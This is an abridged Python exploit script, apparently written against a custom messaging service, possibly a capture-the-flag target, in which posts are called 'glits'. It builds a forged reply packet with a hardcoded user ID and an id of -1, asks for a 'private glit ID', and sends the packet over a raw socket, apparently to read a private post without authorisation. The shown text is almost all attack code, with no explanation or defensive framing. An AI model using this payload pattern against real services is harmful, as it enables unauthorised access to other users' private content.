...
REPLY_EXPLOIT = lambda id: ('650#{gli&&er}{' + f'"glit_id":{id}' + ',"user_id":8209,"user_screen_name":"Unikocado Ufivocado","id":-1,"content":"Test","date":"2022-06-05T18:54:36.840Z"}##').encode()
...
def main():
    try:
        ...
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            ...
            try:
                glit_id = int(input("Enter private glit ID: "))
            except ValueError:
                print(f'\033[91m[ERROR]: \033[0m Invalid Input')
                return None

            
            sock.sendall(REPLY_EXPLOIT(glit_id))
